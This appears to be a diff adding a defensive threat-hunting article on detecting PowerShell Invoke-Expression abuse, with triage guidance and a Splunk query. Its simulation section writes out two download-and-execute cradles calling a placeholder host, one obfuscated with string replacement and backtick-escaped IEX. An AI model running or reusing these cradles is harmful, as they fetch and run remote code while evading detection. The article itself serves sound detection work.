@@ -1,0 +1,28 @@
+Article Title: Threat Hunting for Execution via Microsoft PowerShell Invoke-Expression cmdlets
+
+What is Microsoft PowerShell and what is it used for?
+	PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system that allows users to manage and automate tasks from the command line. PowerShell commands are commonly seen paired with Cmdlet (lightweight commands) to perform various tasks such as downloading and running executables from the internet directly into system memory without writing to disk. There are many such “command lets” available to use with PowerShell.
+
+Threat Hunt Hypothesis:
+	An adversary may attempt to compromise a host by executing PowerShell code with cmdlet (in this case - Invoke-Expression) to carry out malicious activities. This cmdlet is used to execute large blocks of code and is often seen during PowerShell-based system compromises. The plaintext script will include either the "Invoke-Expression" cmdlet or the "iex" alias.
+
+Simulation of Malicious Behavior:
+	--/
+			1)
+			$cmd=powershell "IEX(New-Object Net.WebClient).downloadString('https://XXXX.XXX/downloads/simulation/SimulationCode3.XXX')"
+			Invoke-expression -Command $cmd
+			
+			2)$A='DowRing'.Replace('R','nloadstr');$B = 'WebCAMt'.Replace('AM','lien');$d='tnt'.Replace('tn','Ne');$link ='https://XXXX.XXX';$t1='(New-OS'.Replace('S','bje');$t2='ct Sypek)'.Replace('pe','stem.$d.$B).$A($lin');$WC=I`E`X ($t1,$t2 -Join '')|I`E`X 		
+        /--
+
+Threat Hunt Process:
+	Reviewing the logs from a major Endpoint Detection and Response tool (EDR) or the output from PowerShell script logging would be the most ideal place to look for such adversarial behavior. Querying for any command line arguments or scripts that consists of invoke-expression or iex would be a key indicator to look for if you are conducting this hunt for the first time within your environment. This would also allow you to understand the environment and the business operations better while fine-tuning the query to look for more specific cmdlets in future.
+	Based on the search output, we would expect results containing information such as - the script name, full path from where it executes, script payload, parent process that initiates the script, Hash value of the script etc. This information would assist in narrowing down any known legitimate program that is found common across the environment. By investigating the path of the script and the script payload you might also filter out all known/trusted scripts within your environment. By correlating the script’s process id and the process id of the parent process, you could also obtain the user context. From there, analyzing other processes executing on the target host would then help determine other expected/legit activities. Any events remaining after filtering out legitimate & expected records as described above would require validation and verification to determine maliciousness & intent.
+
+	Any anomaly that is marked suspicious should be remediated by removing the rogue scripts along with the binary that spawned the parent process. The host should then be re-imaged as well if required. Careful usage of the internet and having control over download operations would reduce the risk of systems being infected with rogue processes to begin with.
+
+Reference:
+	https://attack.mitre.org/techniques/T1059/001/
+	
+Sample Splunk Query:
+	(event_name=script or event_name=process) and (command_line IN ('* IEX*', '*I`E`X*', '*IE`X*', '*I`EX*', '*Invoke-Expression*', '*Invoke-Exp*') or script_payload IN ('* IEX*', '*I`E`X*', '*IE`X*', '*I`EX*', '*Invoke-Expression*', '*Invoke-Exp*'))
